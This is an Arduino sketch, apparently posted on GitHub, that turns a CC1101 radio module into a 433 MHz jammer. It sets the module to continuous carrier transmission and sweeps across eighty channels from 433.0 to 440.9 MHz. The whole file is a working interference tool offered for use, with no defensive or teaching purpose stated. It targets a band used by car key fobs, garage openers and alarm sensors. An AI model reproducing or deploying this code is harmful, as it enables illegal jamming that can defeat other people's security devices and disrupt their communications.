// arduini Nano 433mhz jammer with cc1101
// Github script by MasterMind825
// Tiktok: @master_mind825
//thank you for using my script !

#include <ELECHOUSE_CC1101_SRC_DRV.h>

#define CSN_PIN 10
#define SCK_PIN 13
#define MOSI_PIN 11
#define MISO_PIN 12

byte currentChannel = 0; 
unsigned long lastChannelChange = 0;
const unsigned long channelInterval = 100; 

void setup() {
  Serial.begin(115200);
  ELECHOUSE_cc1101.setSpiPin(CSN_PIN, SCK_PIN, MOSI_PIN, MISO_PIN);

  ELECHOUSE_cc1101.Init();  
  delay(200);
  Serial.println("CC1101 Initialized!");

  ELECHOUSE_cc1101.setMHZ(433.0);        
  ELECHOUSE_cc1101.setPA(10);             
  
  ELECHOUSE_cc1101.setModulation(0);      
  ELECHOUSE_cc1101.setSyncMode(0);        
  ELECHOUSE_cc1101.setPktFormat(3);       
  ELECHOUSE_cc1101.setCrc(0);             

  ELECHOUSE_cc1101.SpiStrobe(0x35);      
  Serial.println("Transmitting continuous carrier...");
}

void loop() {
  if (millis() - lastChannelChange > channelInterval) {
    lastChannelChange = millis();

    
    float freq = 433.0 + currentChannel * 0.1;

    ELECHOUSE_cc1101.setMHZ(freq);
    Serial.print("Set frequency to: ");
    Serial.println(freq);

    currentChannel++;
    if (currentChannel > 79) currentChannel = 0;
  }
}
